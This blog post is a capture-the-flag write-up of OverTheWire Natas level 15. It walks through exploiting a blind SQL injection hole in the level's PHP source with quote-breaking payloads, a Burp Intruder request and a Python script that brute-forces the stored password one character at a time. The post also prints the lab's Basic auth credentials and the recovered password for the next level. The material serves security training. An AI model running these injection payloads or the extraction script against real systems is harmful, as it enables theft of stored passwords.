---
layout: post
title: "Natas Level15 - Level16"
date: 2015-10-02 21:06:42
image: '/assets/img/'
description:
tags: Natas CTF
categories: Natas
twitter_text:
---
 Natas 15 looks like it is going to be fun! When I first get to the page, I am greeted by a simple User name search:

    ![Natas 15 search](/assets/img/screenshots/Natas_level15-1.png)

The page will then respond with:

    ![Natas 15 response](/assets/img/screenshots/Natas_level15-2.png)

Lets take a look at the source:

    <html>
    <head>
    <!-- This stuff in the header has nothing to do with the level -->
    <link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
    <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
    <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
    <script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
    <script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
    <script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
    <script>var wechallinfo = { "level": "natas15", "pass": "<censored>" };</script></head>
    <body>
    <h1>natas15</h1>
    <div id="content">
    <?

    /*
    CREATE TABLE `users` (
      `username` varchar(64) DEFAULT NULL,
      `password` varchar(64) DEFAULT NULL
    );
    */

    if(array_key_exists("username", $_REQUEST)) {
        $link = mysql_connect('localhost', 'natas15', '<censored>');
        mysql_select_db('natas15', $link);

        $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
        if(array_key_exists("debug", $_GET)) {
            echo "Executing query: $query<br>";
        }

        $res = mysql_query($query, $link);
        if($res) {
        if(mysql_num_rows($res) > 0) {
            echo "This user exists.<br>";
        } else {
            echo "This user doesn't exist.<br>";
        }
        } else {
            echo "Error in query.<br>";
        }

        mysql_close($link);
    } else {
    ?>

    <form action="index.php" method="POST">
    Username: <input name="username"><br>
    <input type="submit" value="Check existence" />
    </form>
    <? } ?>
    <div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
    </div>
    </body>
    </html>

Again, looking at the source we can tell that this is a sql injection vulnerability. you can see this in the query:

    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";

I suspect that the table contains usernames and passwords. To check that I ran the following query:

    natas16" AND password IS NOT NULL AND "1"="1

Explanation: "password IS NOT NULL" will just check to see if anything exits. if it does it should return true. the 'AND "1'="1' just allows this query to properly execute since that condition is true (And I needed something with quotes for this to be a valid query :))

Next I submitted a query that will check if the passwords first character is "a":

    natas16" AND LEFT(password, 1) = "a

No surprises here, I got a "User does not exist" error. Next I captured this request, and sent it to the Burp Intruder. I set up only a position around the "a" at the end and I loaded the A-Za-z0-9 presets. Here is an example of the request:

    POST /index.php HTTP/1.1
    Host: natas15.natas.labs.overthewire.org
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Firefox/38.0 Iceweasel/38.2.1
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    Referer: http://natas15.natas.labs.overthewire.org/index.php?debug
    Authorization: Basic bmF0YXMxNTpBd1dqMHc1Y3Z4clppT05nWjlKNXN0TlZrbXhkazM5Sg==
    Connection: keep-alive
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 56

    username=natas16%22+AND+LEFT%28password%2C+1%29+%3D+%22§a§

I clicked run and got the first letter of the password:

    ![Natas 15 Burp Intruder](/assets/img/screenshots/Natas_level15-3.png)

Wait, what the hell?

    ![Natas 15 Duplicate letter](/assets/img/screenshots/Natas_level15-4.png)

It looks like the first letter is "w" but the database is not case sensitive so the Burp Intruder found both "w" and "W" send back the same response. To fix this, we just need to change the statment a bit:

    natas16" AND LEFT(password, 1) COLLATE latin1_general_cs = "w

"COLLATE latin1_general_cs" will override the default collation into one that is case sensitive. After I ran this, I got the reponse: "User does not exist." However, when I ran it with the "W" character, I got got the response "User Exists". So lets summarize what we know:

 1. The table has usernames and passwords
 2. All passwords thus far have only contained letters and numbers and were 32 characters long
 3. The database is case insensitive

With those conditions, this sounds like the perfect time to create a script :)

    import urllib
    import urllib2
    cookie='__cfduid=d6d468235c70649795d3603f9283975561442874989; __utma=176859643.1107484385.1442874995.1443039560.1443041564.3; __utmz=176859643.1442874995.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); __utmc=176859643'

    url = 'http://natas15.natas.labs.overthewire.org/index.php'
    referrer = 'natas15.natas.labs.overthewire.org'
    authorization = 'Basic bmF0YXMxNTpBd1dqMHc1Y3Z4clppT05nWjlKNXN0TlZrbXhkazM5Sg=='

    Chars = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r',
    's','t','u','v','w','x','y','z','A','B','C','D','E','F','G','H','I','J','K','L',
    'M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z','0','1','2','3','4','5',
    '6','7','8','9']

    password = ""

    #loop through possible length of password
    for i in range(1, 33):
        print "%d out of 32" % (i)
        #loop through possible chars
        for j in range(0,len(Chars)):
            sqli = 'natas16" AND LEFT(password, %d) COLLATE latin1_general_cs = "%s' % (i,password + Chars[j])
            values = {'username' : sqli}
            data = urllib.urlencode(values)
            req = urllib2.Request(url, data)
            req.add_header('Cookie', cookie)
            req.add_header('Referrer', referrer)
            req.add_header('Authorization', authorization)
            try:
                response = urllib2.urlopen(req)
                the_page = response.read()
                #print the_page
            except HTTPError, e:
                print e.reason
            if "This user exists." in the_page:
                password+=Chars[j]
                print password
                break

I get the following output for the script:

    1 out of 32
    W
    2 out of 32
    Wa
    3 out of 32
    WaI
    4 out of 32
    WaIH

    ...

    29 out of 32
    WaIHEacj63wnNIBROHeqi3p9t0m5n
    30 out of 32
    WaIHEacj63wnNIBROHeqi3p9t0m5nh
    31 out of 32
    WaIHEacj63wnNIBROHeqi3p9t0m5nhm
    32 out of 32
    WaIHEacj63wnNIBROHeqi3p9t0m5nhmh

Boom! our password is:
WaIHEacj63wnNIBROHeqi3p9t0m5nhmh

